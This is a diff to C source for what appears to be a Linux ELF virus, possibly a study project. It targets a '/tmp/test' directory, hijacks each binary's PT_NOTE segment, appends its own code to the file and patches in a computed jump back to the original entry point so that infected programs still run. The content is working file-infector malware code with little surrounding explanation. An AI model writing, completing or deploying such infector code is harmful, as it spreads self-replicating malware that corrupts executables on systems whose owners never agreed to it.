@@ -22,12 +22,11 @@ struct  linux_dirent {
   char            d_name[];
 };
 
-static void  end(void);
+static void end(void);
 static int  infectBins(const char *dirname);
 
 // TODO Payload must be aligned on 16
 int   entry_point(void) {
-  asm("int3");
   /* size_t  i; */
   // TODO Array of string
   char    infectDir[] = "/tmp/test";
@@ -40,9 +39,17 @@ int   entry_point(void) {
   /*     return (1); */
   /*   i += 1; */
   /* } */
+  asm("jmp endSC");
   return (0);
 }
 
+static void  _exit(int status) {
+  asm("int3");
+}
+
+static void  exit(int status) {
+  asm("int3");
+}
 
 static int  write(int fd, const void *buf, size_t count) {
   register int8_t     rax asm("rax") = 1;
@@ -310,12 +317,22 @@ static int  appendShellcode(struct bfile *bin) {
 
   // TODO Replace 7 by size of last instructions
   size = end - start + 7;
-  new.size = bin->size + size;
+  new.size = bin->size + size + 5;
   if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   /* memset(((void *)new.header) + bin->size, 0xcc, 1); */
   memcpy(((void *)new.header) + bin->size, start, size);
+  char    ins[5];
+  size_t  address;
+  address = -(0xc000000 + bin->size - bin->header->e_entry + size + 5);
+  ins[0] = 0xe9;
+  ins[1] = (address >> 0) & 0xff;
+  ins[2] = (address >> 8) & 0xff;
+  ins[3] = (address >> 16) & 0xff;
+  ins[4] = (address >> 24) & 0xff;
+  memcpy(((void *)new.header) + bin->size + size, ins, 5);
+  /* memset(((void *)new.header) + bin->size + size, 0xcc, 5); */
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
@@ -328,7 +345,7 @@ static int  appendCode(struct bfile *bin) {
 
   if (appendShellcode(bin) == -1)
     return (-1);
-  size = end - start;
+  size = end - start + 5;
   segment = ((void *)bin->header) + bin->header->e_phoff;
   while (segment->p_type != PT_NOTE)
     segment += 1;
@@ -417,3 +434,4 @@ static int  infectBins(const char *dirname) {
 }
 
 static void    end(void) {}
+asm("endSC:");
